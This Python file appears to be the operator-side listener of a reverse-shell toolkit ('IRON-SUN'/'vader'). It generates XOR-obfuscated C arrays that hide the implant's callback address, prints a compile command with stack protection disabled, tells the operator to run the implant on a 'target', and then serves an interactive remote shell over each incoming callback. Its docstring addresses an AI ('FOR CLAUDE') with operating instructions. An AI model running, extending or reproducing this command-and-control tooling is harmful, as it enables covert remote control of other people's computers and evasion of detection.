#!/usr/bin/env python3
"""
IRON-SUN LISTENER — 22DIV research
Automated C2 listener + payload configurator.

Detects local IPs, prompts for selection, generates XOR-encoded
payload config, starts listener, handles interactive shell session.

FOR CLAUDE / HUMAN READER:
  This is the operator-side listener. You run this on your machine.
  vader_shell.c (the implant) calls back to your IP:port.

  TWO MODES:
    --gen  : Just prints the XOR-encoded IP array to paste into vader_shell.c.
             No listener started. Use this every time C2 IP changes.
    (no flag): Full listener — accepts connection, gives you interactive shell.

  XOR KEY: 0x41 (different from vader_shell.c's 0xFC — listener uses 0x41
           for config generation output only; shell uses 0xFC internally).

  SESSION FLOW:
    1. Run vader_listener.py 4443
    2. Run vader_shell.exe on target (or let it auto-run)
    3. Shell session opens — type commands, output streams back
    4. 'exit' to close session, listener auto-restarts waiting for next

  DUAL-CHANNEL NOTE (vader_c2_v2.py):
    vader_listener.py is standalone — one connection at a time.
    vader_c2_v2.py is the full multi-session C2 console with Discord
    integration. The Discord channel is DEPRECATED per mentor doctrine
    (pure TCP target). Keep it for backward compat, disable in prod.

Usage:
    python vader_listener.py              # Interactive prompts
    python vader_listener.py 4443         # Quick-start on port 4443
    python vader_listener.py 4443 --gen   # Generate XOR config + compile cmd only
"""

import socket
import sys
import os
import threading
import struct
import time

# Force UTF-8 stdout on Windows (box-drawing chars need it)
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        os.environ.setdefault("PYTHONIOENCODING", "utf-8")

XOR_KEY = 0x41

def xor_encode_string(s):
    """XOR-encode a string, return list of encoded bytes (no null term)."""
    return [b ^ XOR_KEY for b in s.encode('ascii')]

def xor_c_array(name, plaintext):
    """Generate C static const array for XOR-encoded string."""
    encoded = xor_encode_string(plaintext)
    hex_parts = ", ".join(f"0x{b:02X}" for b in encoded)
    comment = "  ".join(f"'{c}'" for c in plaintext)
    return (
        f"static const unsigned char {name}[] = {{\n"
        f"    {hex_parts}\n"
        f"}};\n"
        f"/* {comment} */\n"
        f"#define {name}_LEN {len(encoded)}"
    )

def get_local_ips():
    """Detect all usable local IP addresses."""
    ips = []

    # Primary LAN IP (most reliable method)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        primary = s.getsockname()[0]
        s.close()
        if primary not in [i[0] for i in ips]:
            ips.append((primary, "Primary LAN"))
    except Exception:
        pass

    # All interface IPs via hostname resolution
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None, socket.AF_INET):
            ip = info[4][0]
            if ip not in [i[0] for i in ips] and ip != "127.0.0.1":
                ips.append((ip, "Interface"))
    except Exception:
        pass

    ips.append(("0.0.0.0", "All interfaces"))
    ips.append(("127.0.0.1", "Loopback only"))

    return ips


def banner():
    _IDF = "\033[38;2;0;56;184m"
    _GD  = "\033[38;2;255;215;0m"
    _WH  = "\033[38;2;255;255;255m"
    _CY  = "\033[38;2;0;229;255m"
    _RS  = "\033[0m"
    W = 66; C = W // 2
    rows = []
    for r in range(15):
        h = int(round(C * (14 - r) / 14))
        if h == 0:
            ln = [' '] * W; ln[C] = '✡'; rows.append(''.join(ln)); break
        ln = [' '] * W
        for i in range(17):
            p = int(round(C + (-1.0 + i * 0.125) * h))
            p = max(0, min(W - 1, p))
            ln[p] = '│' if abs(p - C) <= 1 else ('╲' if p < C else '╱')
        rows.append(''.join(ln))
    print()
    print(f"  {_CY}╔{'═'*W}╗")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    for row in rows:
        print(f"  ║{_GD}{row.ljust(W)[:W]}{_CY}║")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    print(f"  ║{_WH}{'T H E   I R O N - S U N'.center(W)}{_CY}║")
    print(f"  ║{_WH}{'A U S T R A L I A N   A R M Y   ·   2 2 D I V'.center(W)}{_CY}║")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    print(f"  ╚{'═'*W}╝{_RS}")
    print()


def receive_loop(sock, alive_event):
    """Background thread: receive data from shell, print to stdout."""
    try:
        while alive_event.is_set():
            try:
                data = sock.recv(4096)
                if not data:
                    break
                sys.stdout.write(data.decode(errors='replace'))
                sys.stdout.flush()
            except socket.timeout:
                continue
            except (ConnectionResetError, ConnectionAbortedError, OSError):
                break
    finally:
        alive_event.clear()


def interactive_shell(conn, addr):
    """Handle one interactive shell session."""
    print(f"\n  \033[32m[+] Connection from {addr[0]}:{addr[1]}\033[0m")
    print("  \033[32m[+] CHEYANNE shell active — Ctrl+C to disconnect\033[0m\n")

    conn.settimeout(0.5)
    alive = threading.Event()
    alive.set()

    recv_thread = threading.Thread(target=receive_loop, args=(conn, alive), daemon=True)
    recv_thread.start()

    # Small delay to let banner arrive
    time.sleep(0.5)

    try:
        while alive.is_set():
            try:
                cmd = input()
            except EOFError:
                break
            if not alive.is_set():
                break
            conn.sendall((cmd + "\n").encode())
    except KeyboardInterrupt:
        print("\n  [*] Disconnecting...")
    except (BrokenPipeError, ConnectionResetError, OSError):
        print("\n  [*] Connection lost")
    finally:
        alive.clear()
        try:
            conn.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        conn.close()


def generate_config(ip, port):
    """Print XOR-encoded C config for compile-time embedding."""
    print()
    print("  \033[33m── XOR CONFIG (paste into bb5_revshell source) ──────────\033[0m")
    print()
    print(f"  {xor_c_array('xC2Addr', ip)}")
    print()
    print(f"  #define C2_PORT {port}")
    print()

    # Also show the decode snippet
    encoded_hex = ", ".join(f"0x{b:02X}" for b in xor_encode_string(ip))
    print(f"  /* Runtime decode: */")
    print(f"  /* unsigned char ipBuf[{len(ip)+1}]; */")
    print(f"  /* memcpy(ipBuf, xC2Addr, xC2Addr_LEN); */")
    print(f"  /* XorDecode(ipBuf, xC2Addr_LEN); */")
    print(f"  /* ipBuf[xC2Addr_LEN] = 0; */")
    print()
    print("  \033[33m── COMPILE COMMAND ──────────────────────────────────────\033[0m")
    print()
    print('  cl.exe bb5_revshell_annotated.c /Fe:cheyanne_shell.exe /O1 /GS- /utf-8')
    print()
    print("  \033[33m── RUN COMMAND (on target, if using runtime args) ──────\033[0m")
    print()
    print(f"  cheyanne_shell.exe {ip} {port}")
    print()


def main():
    banner()

    # Fast-path: port on argv
    quick_port = None
    gen_only = False
    if len(sys.argv) > 1:
        try:
            quick_port = int(sys.argv[1])
        except ValueError:
            pass
    if "--gen" in sys.argv:
        gen_only = True

    # ── IP DETECTION ──
    ips = get_local_ips()
    print("  \033[36m[*] Detected network interfaces:\033[0m")
    for i, (ip, label) in enumerate(ips, 1):
        marker = " \033[32m◄\033[0m" if i == 1 else ""
        print(f"      {{{i}}} {ip:<20s} ({label}){marker}")
    print()

    def clean_input(prompt, default=""):
        """Read input, strip BOM and whitespace, return default if empty/EOF."""
        try:
            val = input(prompt).strip().strip('﻿').strip()
            return val if val else default
        except (KeyboardInterrupt, EOFError):
            return default

    # ── IP SELECTION ──
    if gen_only and not sys.stdin.isatty():
        listen_ip = ips[0][0] if ips else "0.0.0.0"
        print(f"  [*] Auto-selected: {listen_ip} (non-interactive)")
    else:
        choice = clean_input("  [?] Select interface [{1}]: ", "1")
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(ips):
                listen_ip = ips[idx][0]
            else:
                listen_ip = ips[0][0]
        except ValueError:
            listen_ip = choice

    # ── PORT SELECTION ──
    if quick_port:
        listen_port = quick_port
        print(f"  [*] Port: {listen_port} (from argv)")
    elif gen_only and not sys.stdin.isatty():
        listen_port = 4443
        print(f"  [*] Port: {listen_port} (default, non-interactive)")
    else:
        port_raw = clean_input("  [?] Port [4443]: ", "4443")
        try:
            listen_port = int(port_raw)
        except ValueError:
            listen_port = 4443

    # Display IP for payload config (resolve 0.0.0.0 to actual IP)
    display_ip = listen_ip
    if listen_ip == "0.0.0.0" and ips:
        display_ip = ips[0][0]

    print()
    print(f"  \033[36m[*] C2 Configuration:\033[0m")
    print(f"      Listen IP:   {listen_ip}")
    print(f"      Display IP:  {display_ip}")
    print(f"      Port:        {listen_port}")

    # ── GENERATE CONFIG ──
    generate_config(display_ip, listen_port)

    if gen_only:
        print("  [*] --gen mode: config generated. Exiting.")
        return

    # ── START LISTENER ──
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind((listen_ip, listen_port))
    except OSError as e:
        print(f"\n  \033[31m[!] Bind failed: {e}\033[0m")
        print("      Try a different port or run as admin for ports < 1024.")
        sys.exit(1)

    server.listen(1)
    print(f"  \033[32m[*] Listening on {listen_ip}:{listen_port}...\033[0m")
    print(f"  \033[33m[*] Run on target:  cheyanne_shell.exe {display_ip} {listen_port}\033[0m")
    print(f"  [*] Waiting for CHEYANNE callback...\n")

    try:
        while True:
            try:
                conn, addr = server.accept()
                # iron_sun magic auth — must send "ISUN" before shell spawns
                # vader_shell.exe ignores these 4 bytes; iron_sun.exe requires them
                try:
                    conn.send(bytes([0x49,0x53,0x55,0x4E]))
                except Exception:
                    pass
                interactive_shell(conn, addr)
                print("\n  [*] Session ended. Listening for next callback...\n")
            except KeyboardInterrupt:
                print("\n  [*] Listener stopped.")
                break
    finally:
        server.close()


if __name__ == "__main__":
    main()
